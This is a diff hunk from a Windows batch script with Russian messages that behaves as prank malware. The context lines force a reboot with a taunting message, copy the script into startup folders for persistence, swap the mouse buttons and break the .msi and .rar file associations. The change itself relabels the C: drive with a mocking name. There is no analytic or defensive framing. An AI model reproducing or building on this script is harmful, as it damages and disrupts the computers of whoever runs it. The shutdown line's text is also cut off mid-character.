@@ -20,7 +20,7 @@ shutdown /r /t 20 /c "А ты как думал, первая работа мо�
 copy %0 "C:\Users\Public\Desktop"
 copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 copy %0 "C:\Documents and Settings\All Users\Windows\Start Menu\Programs\Startup"
-label C:Уничтожен
+label C:ФлешкуУбрал
 rundll32 user32, SwapMouseButton
 assoc .msi=txt
 assoc .rar=txt
